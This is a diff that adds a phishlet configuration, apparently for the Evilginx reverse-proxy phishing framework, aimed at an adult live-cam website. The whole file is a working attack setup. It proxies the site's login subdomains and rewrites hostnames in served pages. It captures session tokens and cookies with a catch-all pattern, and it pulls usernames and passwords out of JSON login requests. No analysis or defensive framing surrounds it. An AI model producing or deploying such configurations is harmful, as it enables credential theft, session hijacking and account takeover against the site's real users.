@@ -1,0 +1,33 @@
+author: '@cwaizydee'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'sv', orig_sub: 'sv', domain: 'xhamsterlive.com', session: true, is_landing: true, auto_filter: true}
+ 
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'xhamsterlive.com', session: true, is_landing: false}
+  
+
+sub_filters:
+  - {triggers_on: 'www.xhamsterlive.com', orig_sub: '', domain: 'xhamsterlive.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.xhamsterlive.com', orig_sub: '', domain: 'xhamsterlive.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.xhamsterlive.com', orig_sub: '', domain: 'xhamsterlive.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.xhamsterlive.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.xhamsterlive.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: 'sv.xhamsterlive.com'
+    keys: ['uniq','fingerprint','csrfToken','token','.*,regexp']
+  - domain: '.xhamsterlive.com'
+    keys: ['uniq','fingerprint','csrfToken','token','.*,regexp']
+auth_urls:  
+  - '/auth/login'
+credentials:
+  username:
+    key: ''
+    search: '"loginOrEmail":"([^"]*)"'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)"'
+    type: 'json'
+login:
+  domain: 'sv.xhamsterlive.com'
+  path: '/login'
